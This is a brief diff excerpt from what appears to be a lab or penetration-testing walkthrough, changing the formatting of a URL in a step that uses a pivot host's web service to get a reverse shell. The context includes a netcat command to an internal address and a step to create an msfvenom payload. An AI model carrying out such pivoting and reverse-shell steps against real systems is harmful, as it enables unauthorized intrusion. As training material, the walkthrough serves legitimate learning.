@@ -80,7 +80,7 @@ nc 10.102.32.119 7777
 ```
 5.)Use the second pivot host's port 80 service to get a reverse shell:
 
-- Go to <http://10.102.43.238>
+- Go to  `http:// 10.102.43.238`
 
 - Create msfvenom payload:
 
